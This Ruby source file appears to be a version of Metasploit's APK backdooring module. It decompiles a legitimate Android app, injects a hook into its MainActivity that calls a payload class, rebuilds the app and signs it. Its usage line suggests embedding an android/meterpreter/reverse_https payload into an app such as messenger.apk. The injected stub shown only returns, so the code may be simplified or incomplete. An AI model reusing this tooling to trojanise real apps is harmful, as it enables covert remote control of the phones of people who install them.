-- coding: binary --

require 'rex/text' require 'tmpdir' require 'nokogiri' require 'fileutils' require 'optparse' require 'open3' require 'date'

class Msf::Payload::Apk def print_status(msg='') $stderr.puts "[*] #{msg}" end

def print_error(msg='') $stderr.puts "[-] #{msg}" end

alias_method :print_bad, :print_error

def usage print_error "Usage: #{$0} -x [target.apk] [msfvenom options]\n" print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n" end

def run_cmd(cmd) begin stdin, stdout, stderr = Open3.popen3(*cmd) return stdout.read + stderr.read rescue Errno::ENOENT return nil end end

def backdoor_apk(apkfile, raw_payload, signature = true, manifest = true, apk_data = nil, service = true) unless apk_data || apkfile && File.readable?(apkfile) raise RuntimeError, "Invalid template: #{apkfile}" end

check_apktool = run_cmd(%w[apktool -version])
raise RuntimeError, "apktool not found" if check_apktool.nil?

tempdir = Dir.mktmpdir
File.binwrite("#{tempdir}/payload.apk", raw_payload)
FileUtils.cp apkfile, "#{tempdir}/original.apk" if apkfile

print_status "Decompiling original APK..."
apktool_output = run_cmd(['apktool', 'd', "#{tempdir}/original.apk", '--only-main-classes', '-o', "#{tempdir}/original"])

print_status "Decompiling payload APK..."
apktool_output = run_cmd(['apktool', 'd', "#{tempdir}/payload.apk", '-o', "#{tempdir}/payload"])

amanifest = File.open("#{tempdir}/original/AndroidManifest.xml", 'rb') { |file| Nokogiri::XML(file.read) }

print_status "Locating hook point..."
hookable_class = "MainActivity"
hookable_class_filename = hookable_class.gsub('.', '/') + '.smali'
hookable_class_filepath = Dir.glob("#{tempdir}/original/smali*/#{hookable_class_filename}").first

raise "Unable to find class file: #{hookable_class_filepath}" if hookable_class_filepath.nil?

hooksmali = File.binread(hookable_class_filepath)
entrypoint = 'return-void'
raise "Unable to find hookable function in #{hookable_class_filepath}" unless hooksmali.include?(entrypoint)

FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")

package = amanifest.xpath("//manifest").first['package']
package = package.downcase + ".#{Rex::Text::rand_text_alpha_lower(5)}"
payload_class = Rex::Text::rand_text_alpha_lower(5).capitalize
package_slash = package.gsub(/\./, "/")

print_status "Adding payload as package #{package}"
payload_dir = "#{tempdir}/original/smali/#{package_slash}/"
FileUtils.mkdir_p payload_dir

smali_payload = ""
smali_payload << ".class public L#{package_slash}/#{payload_class};\n"
smali_payload << ".super Landroid/app/Service;\n"
smali_payload << ".method public static start()V\n"
smali_payload << "    .registers 1\n"
smali_payload << "    return-void\n"
smali_payload << ".end method\n"

File.write("#{payload_dir}#{payload_class}.smali", smali_payload)

hookfunction = "L#{package_slash}/#{payload_class};->start()V"
payloadhook = %Q^invoke-static {}, #{hookfunction}
^ + entrypoint
hookedsmali = hooksmali.sub(entrypoint, payloadhook)

print_status "Injecting payload into #{hookable_class_filepath}"
File.open(hookable_class_filepath, "wb") { |file| file.puts hookedsmali }

injected_apk = "#{tempdir}/output.apk"
print_status "Rebuilding apk as #{injected_apk}"
apktool_output = run_cmd(['apktool', 'b', '-o', injected_apk, "#{tempdir}/original"])

raise RuntimeError, "Unable to rebuild apk with apktool" unless File.readable?(injected_apk)

if signature
  print_status "Signing #{injected_apk} with apksigner"
  keystore = "#{tempdir}/signing.keystore"
  run_cmd(['keytool', '-genkey', '-v', '-keystore', keystore, '-alias', 'key0', '-storepass', 'android', '-keypass', 'android', '-dname', 'CN=metasploit', '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000'])
  apksigner_output = run_cmd(['apksigner', 'sign', '--ks', keystore, '--ks-pass', 'pass:android', injected_apk])
  raise RuntimeError, 'Signing with apksigner failed.' if apksigner_output.to_s.include?('Failed')
end

outputapk = File.binread(injected_apk)
FileUtils.remove_entry tempdir
outputapk

end end

